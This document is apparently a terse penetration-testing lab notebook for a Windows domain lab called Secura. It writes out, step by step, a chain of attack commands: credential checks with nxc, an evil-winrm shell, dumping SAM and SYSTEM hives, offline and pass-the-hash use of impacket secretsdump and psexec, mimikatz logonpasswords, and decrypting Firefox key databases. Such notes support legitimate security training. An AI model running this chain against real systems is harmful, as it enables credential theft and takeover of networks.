192.168.x.95
192.168.x.96
192.168.x.97 (DC01)

Credentials: Eric.Wallows / EWpasswd

#Initial_Access .95 (Seucre.Secura.Yzx)
nxc smb192.168.x.95 -u eric -p 'EWPasswd'
nxc rdp 192.168.x.95 -u eric -p 'EWPasswd'
nxc winrm 192.168.x.95 -u eric -p 'EWPasswd'

evil-winrm -i 192.168.x.95 -u eric -p 'EWPasswd'

id; whoami; ipconfig; type proof.txt

reg save HKLM\SAM C:\User\administrator\videos\sam
reg save HKLM\SYSTEM C:\users\administrator\videos\system

	download sam
	down system

python3 impacket-secretsdump -sam sam -system system LOCAL

	==> runs impacket secretdump in LOCAL mode again the extracted hives. It uses the BootKey from the SYSTEM hive to decrypt local account secrets stored in the SAM, yielding NTLM hashes for any local users. This approach is host-impact-minimal.


python3 impacket-secretsdump "SECURE/Administrator"@"secure.secura.yzx" -hashes ":NT Hash"

	==> NT hash is recovered from the previous secret dump.


upload ../../../../../../../../../../../mimikatz.exe

python3 impacket-psexec "SECURE/Administrator"@"secure.secura.yzx" -hashes ":a51493b071n"

sekurlsa::logonpasswords

	==> Might have to execute mimikatz first
	==> harvested apache account on 

Upload Winpeas.exe
	==> download key3.db (or key4.db)
	==> decrypt with firepwd (https://github.com/lclevy/firepwd)
	python3 firepwd.py key3.db -v 4


